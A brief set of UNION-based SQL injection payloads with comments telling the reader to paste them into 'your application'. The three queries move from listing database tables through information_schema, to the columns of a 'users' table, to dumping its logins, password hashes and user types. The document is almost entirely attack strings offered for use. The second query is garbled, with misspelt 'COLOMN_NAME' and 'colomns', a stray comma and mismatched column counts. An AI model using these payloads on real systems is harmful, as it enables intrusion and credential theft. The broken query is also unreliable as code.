--//In bellow line copy from single quote ' till the end of the query and paste it in your application and see the magix  //
--//Do it on your own risk.


SELECT ? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);--  

SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT COLOMN_NAME, 2, 3, FROM information_schema.colomns WHERE TABLE_NAME = 'users');--

SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FROM users);--
